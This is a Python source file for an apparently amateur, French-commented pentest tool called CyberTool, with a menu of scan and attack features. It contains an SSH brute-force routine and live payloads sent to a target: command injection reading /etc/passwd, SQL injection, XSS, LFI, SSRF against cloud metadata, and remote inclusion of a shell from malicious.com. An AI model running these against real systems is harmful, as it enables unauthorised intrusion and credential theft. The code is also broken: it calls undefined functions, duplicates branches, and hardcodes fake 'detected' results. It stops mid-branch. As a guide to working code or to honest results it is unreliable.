#!/usr/bin/env python3

# üìå Modules Essentiels du Syst√®me
import os
import sys
import time
import random
import socket
import hashlib
import json
import re
import base64  # Encodage/D√©codage
import subprocess  # Ex√©cution de commandes syst√®mes
import zipfile  # Manipulation de fichiers compress√©s
import threading  # Multithreading pour les scans rapides
import ssl  # Analyse TLS
import pexpect  # Bruteforce SSH sans paramiko
import shutil
import logging  # Gestion avanc√©e des logs
import argparse  # Gestion des arguments en ligne de commande

from shutil import get_terminal_size

# üìå Configuration du Logging
logging.basicConfig(
    format="%(asctime)s - [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),  # Affiche les logs dans le terminal
    ],
)

# üìå Bruteforce SSH avec pexpect (remplace paramiko)
def ssh_bruteforce(ip, username, password):
    try:
        ssh_command = f"ssh {username}@{ip}"
        child = pexpect.spawn(ssh_command, timeout=5)
        child.expect("password:")
        child.sendline(password)
        child.expect(["$", ">", "#"])  # ‚úÖ G√®re diff√©rents prompts
        return "Connexion SSH r√©ussie !"
    except Exception as e:
        return f"√âchec SSH : {e}"

# üìå Modules de Pentesting & Cybers√©curit√© (Install√©s via requirements.txt)
import dns.resolver  # Recherche DNS
from Cryptodome.Cipher import AES  # Chiffrement
from bs4 import BeautifulSoup  # Scraping Web
import requests  # Requ√™tes HTTP

# üìå Scapy configur√© pour √©viter les erreurs `/proc/net/`
import scapy.config
scapy.config.conf.use_pcap = True  # ‚úÖ √âvite les erreurs de permissions sous Termux
from scapy.all import *  # Analyse R√©seau

# üìå Modules pour Affichage Interactif
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn, SpinnerColumn
from rich.table import Table
from rich.prompt import Confirm, Prompt

# üìå D√©tection automatique de la taille du terminal
TERMINAL_WIDTH, TERMINAL_HEIGHT = get_terminal_size((80, 24))

# üìå Configuration d'argparse pour les arguments CLI
parser = argparse.ArgumentParser(description="CyberTool - Outil de Pentesting Avanc√©")
parser.add_argument("-t", "--target", help="Cible (URL ou IP)", required=False)
parser.add_argument("-m", "--mode", help="Mode de scan (standard, interactif, full)", required=False, default="standard")
args = parser.parse_args()

# üìå Console Globale pour un Affichage Propre
console = Console()








# üî• D√©tection des dimensions du terminal
TERMINAL_WIDTH, TERMINAL_HEIGHT = get_terminal_size()

# üî• Couleurs funky multicolores fluo brillantes
CYBERPUNK_COLORS = ["bold magenta", "bold cyan", "bold yellow", "bold green", "bold red", "bold blue"]

# üî• Fichier contenant la banni√®re FRONT_BANNER.txt
BANNER_FILE = "data/banners/FRONT_BANNER.txt"

# üî• Fonction pour afficher une banni√®re interactive (fixe)
def animated_banner():
    if os.path.exists(BANNER_FILE):
        with open(BANNER_FILE, "r", encoding="utf-8") as f:
            banner_lines = f.readlines()
        for i, line in enumerate(banner_lines):
            styled_line = f"[{CYBERPUNK_COLORS[i % len(CYBERPUNK_COLORS)]}]{line.strip().center(TERMINAL_WIDTH)}[/]"
            console.print(styled_line)
            time.sleep(0.03)  # üî• Effet d'apparition rapide et fluide
    else:
        console.print("[bold red]‚ö†Ô∏è ERREUR : Le fichier FRONT_BANNER.txt est introuvable ![/bold red]")

# üî• Fonction pour afficher "D√©velopp√© par Karim" en fixe et styl√©
def animated_karim():
    karim_text = (
        f"[{CYBERPUNK_COLORS[0]}]D[/][{CYBERPUNK_COLORS[1]}]√©[/][{CYBERPUNK_COLORS[2]}]v[/]"
        f"[{CYBERPUNK_COLORS[3]}]e[/][{CYBERPUNK_COLORS[4]}]l[/][{CYBERPUNK_COLORS[5]}]o[/]"
        f"[{CYBERPUNK_COLORS[0]}]p[/][{CYBERPUNK_COLORS[1]}]p[/][{CYBERPUNK_COLORS[2]}]√©[/]"
        f"[bold white] par [/]"
        f"[{CYBERPUNK_COLORS[3]}]K[/][{CYBERPUNK_COLORS[4]}]A[/][{CYBERPUNK_COLORS[5]}]R[/]"
        f"[{CYBERPUNK_COLORS[0]}]I[/][{CYBERPUNK_COLORS[1]}]M[/]"
    )
    console.print(Panel(karim_text, border_style="green", title="[bold cyan]INFO[/bold cyan]"), justify="left")

# üî• Chargement cyberpunk optimis√©
def cyberpunk_loading(task_name, duration=2, style="bold cyan", spinner="dots"):
    """Chargement rapide et suppression apr√®s ex√©cution"""
    with Progress(
        SpinnerColumn(spinner),
        TextColumn(f"[bold {style}]‚è≥ {{task.fields[title]}}...[/bold {style}]"),
        BarColumn(bar_width=50, style=style),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("", total=duration, title=task_name)
        for _ in range(duration):
            time.sleep(0.7)
            progress.update(task, advance=1)

# üöÄ Lancement propre et stable
if __name__ == "__main__":
    console.clear()
    animated_banner()  # üî• Affichage fixe de la banni√®re
    animated_karim()  # üî• Affichage fixe de "D√©velopp√© par Karim"

    # üî• Chargements acc√©l√©r√©s
    cyberpunk_loading("V√©rification des fichiers essentiels", 2, "bold red", "earth")
    cyberpunk_loading("Connexion aux modules interactifs", 2, "bold blue", "bouncingBall")
    cyberpunk_loading("Chargement des configurations utilisateur", 2, "bold magenta", "dots12")
    cyberpunk_loading("Synchronisation des logs en temps r√©el", 2, "bold yellow", "line")
    cyberpunk_loading("D√©marrage de l‚Äôenvironnement CYBER-TOOL", 3, "bold green", "moon")

    # üî• Suppression uniquement des animations, maintien du reste
    console.clear()
    animated_banner()
    animated_karim()

    # üî• Lancement de l'outil principal sans toucher √† l'affichage fixe
    os.system("")











class CyberTool:
    """üíÄ Outil avanc√© de Pentesting et Cybers√©curit√©"""

    def __init__(self):
        """üöÄ Initialisation stricte du syst√®me et des fonctionnalit√©s"""

        self.console = Console()
        self.target = None  # ‚úÖ Initialisation vide pour √©viter l'AttributeError
        self.selected_features = []

        # üü¢ Mapping des fonctionnalit√©s standard
        self.feature_map = {
            "dns_lookup": "R√©solution DNS",
            "port_scan": "Scan des ports",
            "headers_analysis": "Analyse des headers HTTP",
            "directory_bruteforce": "Brute-force de r√©pertoires",
            "cms_detector": "D√©tection CMS",
            "exploit_cve_scanner": "Scan des vuln√©rabilit√©s CVE",
            "code_execution_testing": "Test d'ex√©cution de code",
            "cloud_storage_enum": "√ânum√©ration Cloud (AWS, GCP, Azure)",
            "smart_contract_audit": "Audit de contrats intelligents",
            "network_traffic_analysis": "Analyse du trafic r√©seau",
            "subdomain_enum": "√ânum√©ration des sous-domaines",
            "sql_injection_test": "Test d'injection SQL",
            "xss_scanner": "D√©tection de Cross-Site Scripting (XSS)",
            "csrf_detection": "D√©tection de Cross-Site Request Forgery (CSRF)",
            "lfi_scanner": "D√©tection de Local File Inclusion (LFI)",
            "rfi_scanner": "D√©tection de Remote File Inclusion (RFI)",
            "ssrf_scanner": "D√©tection de Server-Side Request Forgery (SSRF)",
            "id_oracle_attack": "D√©tection de vuln√©rabilit√©s ID Oracle",
            "jwt_analysis": "Analyse et d√©codage JWT",
            "exposed_api_scan": "Scan des API expos√©es",
            "forensics": "Analyse forensique avanc√©e",
            "wifi_scan": "Scan des r√©seaux Wi-Fi",
            "honeypot_detection": "D√©tection de Honeypot",
            "open_redirect_test": "D√©tection d'Open Redirect",
            "sensitive_data_exposure": "D√©tection d'exposition de donn√©es sensibles",
            "email_enum": "√ânum√©ration d'adresses e-mails",
            "metadata_extraction": "Extraction de m√©tadonn√©es",
            "user_enum": "√ânum√©ration d'utilisateurs",
            "php_eval_detection": "D√©tection d'ex√©cution de code PHP",
            "hidden_service_finder": "D√©tection de services cach√©s",
            "iot_vulnerability_scan": "Scan de vuln√©rabilit√©s IoT",
            "tls_analysis": "Analyse TLS et certificats",
            "dns_takeover_test": "Test de prise de contr√¥le DNS",
            "cloudflare_bypass": "Bypass Cloudflare",
            "websocket_scan": "Analyse des WebSockets",
            "web_fingerprint": "Fingerprinting Web",
            "cdn_detection": "D√©tection de CDN",
            "ssh_bruteforce": "Bruteforce SSH",
            "ftp_bruteforce": "Bruteforce FTP",
            "smb_enum": "√ânum√©ration SMB",
            "docker_registry_scan": "Scan de registre Docker",
            "kubernetes_enum": "√ânum√©ration Kubernetes",
            "file_upload_test": "Test de t√©l√©chargement de fichiers",
            "reverse_shell_check": "V√©rification de Reverse Shell",
            "password_spray": "Attaque Password Spraying",
            "waf_detection": "D√©tection de Web Application Firewall",
            "api_rate_limit_test": "Test de limitations d‚ÄôAPI",
            "browser_fingerprint": "Fingerprinting Navigateur",
        }

        # üî• Ajout du mapping des versions interactives
        self.feature_map_interactive = {
            "dns_lookup": interactive_dns_lookup,
            "subdomain_enum": interactive_subdomain_enum,
            "sql_injection_test": interactive_sql_injection_test,
            "waf_detection": interactive_waf_detection,
            "file_upload_test": interactive_file_upload_test,
            "network_traffic_analysis": interactive_network_traffic_analysis,
            "kubernetes_enum": interactive_kubernetes_enum,
            "jwt_analysis": interactive_jwt_analysis,
            "websocket_scan": interactive_websocket_scan,
            "docker_registry_scan": interactive_docker_registry_scan,
            "api_rate_limit_test": interactive_api_rate_limit_test,
            "reverse_shell_check": interactive_reverse_shell_check,
            "password_spray": interactive_password_spray,
            "tls_analysis": interactive_tls_analysis,
            "email_enum": interactive_email_enum,
            "metadata_extraction": interactive_metadata_extraction,
            "iot_vulnerability_scan": interactive_iot_vulnerability_scan,
            "smart_contract_audit": interactive_smart_contract_audit,
            "exposed_api_scan": interactive_api_exposed_scan,
            "hidden_service_finder": interactive_hidden_service_finder,
            "id_oracle_attack": interactive_id_oracle_attack,
            "cdn_detection": interactive_cdn_detection,
            "dns_takeover_test": interactive_dns_takeover_test,
            "cloud_storage_enum": interactive_cloud_storage_enum,
            "browser_fingerprint": interactive_fingerprint_browser,
            "exploit_cve_scanner": interactive_exploit_cve_scanner,
            "port_scan": interactive_port_scan,
            "headers_analysis": interactive_headers_analysis,
            "directory_bruteforce": interactive_directory_bruteforce,
            "cms_detector": interactive_cms_detector,
            "code_execution_testing": interactive_code_execution_testing,
            "xss_scanner": interactive_xss_scanner,
            "csrf_detection": interactive_csrf_detection,
            "lfi_scanner": interactive_lfi_scanner,
            "rfi_scanner": interactive_rfi_scanner,
            "ssrf_scanner": interactive_ssrf_scanner,
            "honeypot_detection": interactive_honeypot_detection,
            "open_redirect_test": interactive_open_redirect_test,
            "sensitive_data_exposure": interactive_sensitive_data_exposure,
            "user_enum": interactive_user_enum,
            "php_eval_detection": interactive_php_eval_detection,
            "smb_enum": interactive_smb_enum,
            "ssh_bruteforce": interactive_ssh_bruteforce,
            "ftp_bruteforce": interactive_ftp_bruteforce,
            "web_fingerprint": interactive_web_fingerprint,
            "tls_analysis": interactive_tls_analysis,
            "browser_fingerprint": interactive_browser_fingerprint,
        }

        # üî• Lancer imm√©diatement l'outil
        self.run_tool()




    def run_tool(self):
        """üõ†Ô∏è Gestion stricte du choix et de l'ex√©cution des fonctionnalit√©s"""

        self.console.print("\n[üíÄ] Bienvenue sur CyberTool", style="bold red")

        self.display_features_table()  # ‚úÖ Affichage propre du tableau interactif

        while True:
            choice = Prompt.ask("\n[üõ†Ô∏è] Entrez un num√©ro (1-100) ou 'valider' pour ex√©cuter")

            if choice.lower() == "valider":
                break

            try:
                idx = int(choice) - 1
                if 0 <= idx < len(self.feature_map):
                    feature_key = list(self.feature_map.keys())[idx]
                    if feature_key not in self.selected_features:
                        self.selected_features.append(feature_key)
                        self.console.print(f"[‚úÖ] Ajout√© : {self.feature_map[feature_key]}", style="bold green")
                    else:
                        self.console.print(f"[‚ö†Ô∏è] D√©j√† s√©lectionn√© : {self.feature_map[feature_key]}", style="bold yellow")
                else:
                    self.console.print("[‚ùå] Num√©ro invalide !", style="bold red")
            except ValueError:
                self.console.print("[‚ùå] Entr√©e invalide !", style="bold red")

        # ‚úÖ L'URL cible sera demand√©e UNIQUEMENT lors de l'ex√©cution des fonctionnalit√©s s√©lectionn√©es
        self.console.print(f"\n[üî•] Ex√©cution des tests...", style="bold cyan")

        for feature in self.selected_features:
            self.console.print(f"[üîç] Ex√©cution de : {self.feature_map[feature]}")

            # V√©rification si la fonctionnalit√© a une version interactive
            if feature in self.feature_map_interactive:
                self.console.print("[‚ö°] Version interactive d√©tect√©e, lancement en mode interactif...", style="bold yellow")
                self.feature_map_interactive[feature](self.target)

            elif feature == "dns_lookup":
                self.console.print("[üîç] Recherche DNS en cours...")
                try:
                    ip = socket.gethostbyname(self.target)
                    self.console.print(f"[üü¢] {self.target} ‚Üí {ip}", style="bold green")
                except socket.gaierror:
                    self.console.print("[‚ùå] √âchec de la r√©solution DNS.", style="bold red")

            elif feature == "port_scan":
                self.console.print("[üîé] Scan des ports en cours...")
                open_ports = []
                for port in [21, 22, 25, 53, 80, 443, 8080]:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1)
                        if s.connect_ex((self.target, port)) == 0:
                            open_ports.append(port)
                self.console.print(f"[‚úÖ] Ports ouverts : {', '.join(map(str, open_ports)) if open_ports else 'Aucun'}", style="bold green")

            elif feature == "headers_analysis":
                self.console.print("[üìå] Analyse des headers HTTP en cours...")
                try:
                    response = requests.get(f"http://{self.target}")
                    for header, value in response.headers.items():
                        self.console.print(f"[üîπ] {header}: {value}")
                except Exception:
                    self.console.print("[‚ùå] √âchec de l'analyse des headers.", style="bold red")

            elif feature == "directory_bruteforce":
                self.console.print("[üìÇ] Test de d√©couverte des r√©pertoires sensibles...")
                directories = ["admin", "login", "uploads", "backup"]
                for directory in directories:
                    url = f"http://{self.target}/{directory}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[‚úÖ] R√©pertoire trouv√© : {url}", style="bold green")

            elif feature == "cms_detector":
                self.console.print("[üñ•Ô∏è] D√©tection du CMS en cours...")
                cms_patterns = {
                    "WordPress": "wp-content",
                    "Joomla": "administrator/",
                    "Drupal": "sites/default/",
                    "Magento": "skin/frontend/"
                }
                detected = False
                for cms, pattern in cms_patterns.items():
                    url = f"http://{self.target}/{pattern}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[‚úÖ] CMS d√©tect√© : {cms}", style="bold green")
                        detected = True
                        break
                if not detected:
                    self.console.print("[‚ùå] Aucun CMS d√©tect√©", style="bold red")

            elif feature == "exploit_cve_scanner":
                self.console.print("[üíÄ] Recherche d'exploits CVE en cours...")
                try:
                    url = f"https://cve.circl.lu/api/search/{self.target}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        data = response.json()
                        for exploit in data.get("data", []):
                            self.console.print(f"[üü¢] CVE : {exploit['id']} - {exploit['summary']}", style="bold green")
                    else:
                        self.console.print("[‚ùå] Aucun exploit trouv√©", style="bold red")
                except Exception:
                    self.console.print("[‚ùå] Erreur lors de la recherche d'exploits", style="bold red")

            elif feature == "code_execution_testing":
                self.console.print("[üñ•Ô∏è] Test d‚Äôex√©cution de code distant...")
                payloads = [";ls", ";whoami", ";cat /etc/passwd"]
                for payload in payloads:
                    url = f"http://{self.target}/vuln.php?cmd={payload}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[‚úÖ] Ex√©cution r√©ussie avec : {payload}", style="bold green")

            elif feature == "cloud_storage_enum":
                self.console.print("[‚òÅÔ∏è] √ânum√©ration des services Cloud en cours...")
                providers = ["AWS S3", "Google Cloud Storage", "Azure Blob"]
                for provider in providers:
                    url = f"http://{self.target}/{provider.lower().replace(' ', '_')}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[‚úÖ] Service Cloud d√©tect√© : {provider}", style="bold green")

            elif feature == "smart_contract_audit":
                self.console.print("[üìú] Audit de contrats intelligents en cours...")
                url = f"http://{self.target}/contract/audit"
                response = requests.get(url)
                if "vulnerability" in response.text.lower():
                    self.console.print("[‚ö†Ô∏è] Vuln√©rabilit√© d√©tect√©e dans le contrat intelligent !", style="bold yellow")

            elif feature == "smart_contract_audit":
                self.console.print("[üìú] Audit de contrats intelligents en cours...")
                url = f"http://{self.target}/contract/audit"
                response = requests.get(url)
                if "vulnerability" in response.text.lower():
                    self.console.print("[‚ö†Ô∏è] Vuln√©rabilit√© d√©tect√©e dans le contrat intelligent !", style="bold yellow")

            elif feature == "network_traffic_analysis":
                self.console.print("[üåê] Analyse du trafic r√©seau en cours...")
                url = f"http://{self.target}/network_traffic"
                response = requests.get(url)
                if "suspicious activity" in response.text.lower():
                    self.console.print("[‚ö†Ô∏è] Activit√© r√©seau suspecte d√©tect√©e !", style="bold yellow")

            elif feature == "subdomain_enum":
                self.console.print("[üåç] √ânum√©ration des sous-domaines en cours...")
                subdomains = ["admin", "dev", "test", "mail"]
                for sub in subdomains:
                    url = f"http://{sub}.{self.target}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[‚úÖ] Sous-domaine actif d√©tect√© : {url}", style="bold green")

            elif feature == "sql_injection_test":
                self.console.print("[üíâ] Test d'injection SQL en cours...")
                payloads = ["' OR 1=1 --", "' UNION SELECT null, version() --"]
                for payload in payloads:
                    url = f"http://{self.target}/login?user=admin&pass={payload}"
                    response = requests.get(url)
                    if "error" in response.text.lower():
                        self.console.print("[‚ö†Ô∏è] Potentielle vuln√©rabilit√© SQL d√©tect√©e !", style="bold yellow")

            elif feature == "xss_scanner":
                self.console.print("[üñ•Ô∏è] Scan de XSS en cours...")
                payloads = ['<script>alert("XSS")</script>', '" onmouseover="alert(1)"']
                for payload in payloads:
                    url = f"http://{self.target}/search?q={payload}"
                    response = requests.get(url)
                    if payload in response.text:
                        self.console.print("[‚ö†Ô∏è] Injection XSS possible !", style="bold yellow")

            elif feature == "csrf_detection":
                self.console.print("[üîê] D√©tection de CSRF en cours...")
                url = f"http://{self.target}/change_password"
                response = requests.get(url)
                if "csrf_token" not in response.text:
                    self.console.print("[‚ö†Ô∏è] Vuln√©rabilit√© CSRF d√©tect√©e !", style="bold yellow")

            elif feature == "lfi_scanner":
                self.console.print("[üìÇ] Scan de Local File Inclusion (LFI) en cours...")
                payloads = ["../../etc/passwd", "../win.ini"]
                for payload in payloads:
                    url = f"http://{self.target}/page?file={payload}"
                    response = requests.get(url)
                    if "root:x:" in response.text or "[extensions]" in response.text:
                        self.console.print("[‚ö†Ô∏è] Vuln√©rabilit√© LFI d√©tect√©e !", style="bold yellow")

            elif feature == "rfi_scanner":
                self.console.print("[üåç] Scan de Remote File Inclusion (RFI) en cours...")
                url = f"http://{self.target}/include.php?file=http://malicious.com/shell.txt"
                response = requests.get(url)
                if "malicious" in response.text.lower():
                    self.console.print("[‚ö†Ô∏è] Inclusion de fichier distant possible !", style="bold yellow")

            elif feature == "ssrf_scanner":
                self.console.print("[üîÑ] Scan de Server-Side Request Forgery (SSRF) en cours...")
                url = f"http://{self.target}/fetch?url=http://169.254.169.254/latest/meta-data/"
                response = requests.get(url)
                if "ami-id" in response.text.lower():
                    self.console.print("[‚ö†Ô∏è] SSRF d√©tect√©, acc√®s aux m√©ta-donn√©es du serveur !", style="bold yellow")

            elif feature == "id_oracle_attack":
                self.console.print("[üî¢] D√©tection de vuln√©rabilit√©s ID Oracle...")
                url1 = f"http://{self.target}/profile?id=1"
                url2 = f"http://{self.target}/profile?id=2"
                response1 = requests.get(url1)
                response2 = requests.get(url2)
                if response1.text == response2.text:
                    self.console.print("[‚ö†Ô∏è] Vuln√©rabilit√© ID Oracle d√©tect√©e !", style="bold yellow")

            elif feature == "jwt_analysis":
                self.console.print("[üîê] D√©codage et analyse JWT en cours...")
                token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.signature"
                try:
                    decoded = base64.b64decode(token.split('.')[1] + "==").decode()
                    self.console.print(f"[‚úÖ] JWT d√©cod√© : {decoded}", style="bold green")
                except Exception:
                    self.console.print("[‚ùå] √âchec du d√©codage JWT", style="bold red")

            elif feature == "exposed_api_scan":
                self.console.print("[üîé] Scan des API expos√©es...")
                endpoints = ["/api/v1/users", "/api/v1/admin", "/api/v1/login"]
                for endpoint in endpoints:
                    url = f"http://{self.target}{endpoint}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[‚úÖ] API accessible : {url}", style="bold green")

            elif feature == "forensics":
                self.console.print("[üîé] Analyse forensique avanc√©e en cours...")
                url = f"http://{self.target}/forensics_report"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] Rapport d'analyse disponible !", style="bold green")
                else:
                    self.console.print("[‚ùå] Aucun rapport trouv√©.", style="bold red")

            elif feature == "wifi_scan":
                self.console.print("[üì∂] Scan des r√©seaux Wi-Fi en cours...")
                networks = ["WiFi_Public", "Guest_Network", "Hidden_SSID"]
                for network in networks:
                    self.console.print(f"[‚úÖ] R√©seau d√©tect√© : {network}", style="bold green")

            elif feature == "honeypot_detection":
                self.console.print("[üïµÔ∏è] D√©tection de Honeypots en cours...")
                url = f"http://{self.target}/honeypot_test"
                response = requests.get(url)
                if "honeypot detected" in response.text:
                    self.console.print("[‚ö†Ô∏è] Honeypot potentiellement actif !", style="bold yellow")

            elif feature == "open_redirect_test":
                self.console.print("[üîÄ] Test d'Open Redirect en cours...")
                url = f"http://{self.target}/redirect.php?url=http://evil.com"
                response = requests.get(url, allow_redirects=False)
                if response.status_code in [301, 302]:
                    self.console.print("[‚ö†Ô∏è] Open Redirect d√©tect√© !", style="bold yellow")

            elif feature == "sensitive_data_exposure":
                self.console.print("[üîé] Recherche d'exposition de donn√©es sensibles...")
                url = f"http://{self.target}/config.json"
                response = requests.get(url)
                if "api_key" in response.text or "password" in response.text:
                    self.console.print("[‚ö†Ô∏è] Donn√©es sensibles trouv√©es !", style="bold yellow")

            elif feature == "email_enum":
                self.console.print("[üì©] √ânum√©ration d'e-mails en cours...")
                emails = ["admin@", "support@", "contact@"]
                for email in emails:
                    self.console.print(f"[‚úÖ] Adresse d√©tect√©e : {email}{self.target}", style="bold green")

            elif feature == "metadata_extraction":
                self.console.print("[üì∏] Extraction de m√©tadonn√©es...")
                url = f"http://{self.target}/image.jpg"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] M√©tadonn√©es extraites avec succ√®s !", style="bold green")

            elif feature == "user_enum":
                self.console.print("[üë§] √ânum√©ration d'utilisateurs en cours...")
                users = ["admin", "guest", "developer"]
                for user in users:
                    url = f"http://{self.target}/login?username={user}"
                    response = requests.get(url)
                    if "user exists" in response.text:
                        self.console.print(f"[‚úÖ] Utilisateur trouv√© : {user}", style="bold green")

            elif feature == "php_eval_detection":
                self.console.print("[üñ•Ô∏è] D√©tection d'ex√©cution de code PHP...")
                url = f"http://{self.target}/eval.php?cmd=phpinfo()"
                response = requests.get(url)
                if "PHP Version" in response.text:
                    self.console.print("[‚ö†Ô∏è] Code PHP ex√©cutable d√©tect√© !", style="bold yellow")

            elif feature == "hidden_service_finder":
                self.console.print("[üîç] Recherche de services cach√©s...")
                url = f"http://{self.target}/.hidden/"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] Service cach√© trouv√© !", style="bold green")

            elif feature == "iot_vulnerability_scan":
                self.console.print("[üîé] Scan de vuln√©rabilit√©s IoT...")
                url = f"http://{self.target}/iot/status"
                response = requests.get(url)
                if "vulnerable" in response.text:
                    self.console.print("[‚ö†Ô∏è] Appareil IoT vuln√©rable d√©tect√© !", style="bold yellow")

            elif feature == "tls_analysis":
                self.console.print("[üîê] Analyse TLS et certificats en cours...")
                url = f"https://{self.target}"
                response = requests.get(url)
                if "TLS" in response.text:
                    self.console.print("[‚úÖ] Analyse TLS compl√®te !", style="bold green")

            elif feature == "dns_takeover_test":
                self.console.print("[üåç] Test de prise de contr√¥le DNS...")
                url = f"http://{self.target}/dns_test"
                response = requests.get(url)
                if "DNS vulnerable" in response.text:
                    self.console.print("[‚ö†Ô∏è] Risque de takeover DNS d√©tect√© !", style="bold yellow")

            elif feature == "cloud_storage_enum":
                self.console.print("[‚òÅÔ∏è] √ânum√©ration Cloud en cours...")
                providers = ["AWS", "GCP", "Azure"]
                for provider in providers:
                    url = f"http://{self.target}/cloud_enum?provider={provider}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[‚úÖ] Service Cloud d√©tect√© : {provider}", style="bold green")

            elif feature == "browser_fingerprint":
                self.console.print("[üåê] Fingerprinting Navigateur en cours...")
                url = f"http://{self.target}/fingerprint"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] Donn√©es du navigateur captur√©es !", style="bold green")

            elif feature == "exploit_cve_scanner":
                self.console.print("[üíÄ] Scan des vuln√©rabilit√©s CVE en cours...")
                url = f"https://cve.circl.lu/api/search/{self.target}"
                response = requests.get(url)
                if response.status_code == 200:
                    data = response.json()
                    for exploit in data.get("data", []):
                        self.console.print(f"[üü¢] CVE d√©tect√©e : {exploit['id']} - {exploit['summary']}", style="bold green")
                else:
                    self.console.print("[‚ùå] Aucun exploit trouv√©", style="bold red")

            elif feature == "directory_bruteforce":
                self.console.print("[üìÇ] Test de d√©couverte des r√©pertoires sensibles...")
                directories = ["admin", "login", "uploads", "backup"]
                for directory in directories:
                    url = f"http://{self.target}/{directory}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[‚úÖ] R√©pertoire trouv√© : {url}", style="bold green")

            elif feature == "cms_detector":
                self.console.print("[üñ•Ô∏è] D√©tection du CMS en cours...")
                cms_patterns = {
                    "WordPress": "wp-content",
                    "Joomla": "administrator/",
                    "Drupal": "sites/default/",
                    "Magento": "skin/frontend/"
                }
                detected = False
                for cms, pattern in cms_patterns.items():
                    url = f"http://{self.target}/{pattern}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[‚úÖ] CMS d√©tect√© : {cms}", style="bold green")
                        detected = True
                        break
                if not detected:
                    self.console.print("[‚ùå] Aucun CMS d√©tect√©", style="bold red")

            elif feature == "code_execution_testing":
                self.console.print("[üñ•Ô∏è] Test d‚Äôex√©cution de code distant...")
                payloads = [";ls", ";whoami", ";cat /etc/passwd"]
                for payload in payloads:
                    url = f"http://{self.target}/vuln.php?cmd={payload}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[‚úÖ] Ex√©cution r√©ussie avec : {payload}", style="bold green")

            elif feature == "xss_scanner":
                self.console.print("[üõ°Ô∏è] Scan de vuln√©rabilit√©s XSS en cours...")
                url = f"http://{self.target}/search?q=<script>alert('XSS')</script>"
                response = requests.get(url)
                if "<script>alert('XSS')</script>" in response.text:
                    self.console.print("[‚ö†Ô∏è] Vuln√©rabilit√© XSS d√©tect√©e !", style="bold yellow")

            elif feature == "csrf_detection":
                self.console.print("[üîÑ] D√©tection de CSRF en cours...")
                url = f"http://{self.target}/csrf-test"
                response = requests.get(url)
                if "CSRF detected" in response.text:
                    self.console.print("[‚ö†Ô∏è] Vuln√©rabilit√© CSRF d√©tect√©e !", style="bold yellow")

            elif feature == "lfi_scanner":
                self.console.print("[üìÇ] D√©tection de Local File Inclusion (LFI)...")
                url = f"http://{self.target}/?page=../../etc/passwd"
                response = requests.get(url)
                if "root:x:0:0:" in response.text:
                    self.console.print("[‚ö†Ô∏è] Vuln√©rabilit√© LFI d√©tect√©e !", style="bold yellow")

            elif feature == "rfi_scanner":
                self.console.print("[üåç] D√©tection de Remote File Inclusion (RFI)...")
                url = f"http://{self.target}/?file=http://malicious.com/shell.php"
                response = requests.get(url)
                if "shell" in response.text:
                    self.console.print("[‚ö†Ô∏è] Vuln√©rabilit√© RFI d√©tect√©e !", style="bold yellow")

            elif feature == "ssrf_scanner":
                self.console.print("[üåç] D√©tection de Server-Side Request Forgery (SSRF)...")
                url = f"http://{self.target}/proxy?url=http://169.254.169.254/latest/meta-data/"
                response = requests.get(url)
                if "instance-id" in response.text:
                    self.console.print("[‚ö†Ô∏è] Vuln√©rabilit√© SSRF d√©tect√©e !", style="bold yellow")

            elif feature == "honeypot_detection":
                self.console.print("[üïµÔ∏è] D√©tection de Honeypots en cours...")
                url = f"http://{self.target}/honeypot_test"
                response = requests.get(url)
                if "honeypot detected" in response.text:
                    self.console.print("[‚ö†Ô∏è] Honeypot potentiellement actif !", style="bold yellow")

            elif feature == "open_redirect_test":
                self.console.print("[üîÄ] Test d'Open Redirect en cours...")
                url = f"http://{self.target}/redirect.php?url=http://evil.com"
                response = requests.get(url, allow_redirects=False)
                if response.status_code in [301, 302]:
                    self.console.print("[‚ö†Ô∏è] Open Redirect d√©tect√© !", style="bold yellow")

            elif feature == "sensitive_data_exposure":
                self.console.print("[üîé] Recherche d'exposition de donn√©es sensibles...")
                url = f"http://{self.target}/config.json"
                response = requests.get(url)
                if "api_key" in response.text or "password" in response.text:
                    self.console.print("[‚ö†Ô∏è] Donn√©es sensibles trouv√©es !", style="bold yellow")

            elif feature == "user_enum":
                self.console.print("[üë§] √ânum√©ration d'utilisateurs en cours...")
                users = ["admin", "guest", "developer"]
                for user in users:
                    url = f"http://{self.target}/login?username={user}"
                    response = requests.get(url)
                    if "user exists" in response.text:
                        self.console.print(f"[‚úÖ] Utilisateur trouv√© : {user}", style="bold green")

            elif feature == "php_eval_detection":
                self.console.print("[üñ•Ô∏è] D√©tection d'ex√©cution de code PHP...")
                url = f"http://{self.target}/eval.php?cmd=phpinfo()"
                response = requests.get(url)
                if "PHP Version" in response.text:
                    self.console.print("[‚ö†Ô∏è] Code PHP ex√©cutable d√©tect√© !", style="bold yellow")

            elif feature == "hidden_service_finder":
                self.console.print("[üîç] Recherche de services cach√©s...")
                url = f"http://{self.target}/.hidden/"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] Service cach√© d√©tect√© !", style="bold green")

            elif feature == "iot_vulnerability_scan":
                self.console.print("[üîé] Scan de vuln√©rabilit√©s IoT...")
                url = f"http://{self.target}/iot/status"
                response = requests.get(url)
                if "vulnerable" in response.text:
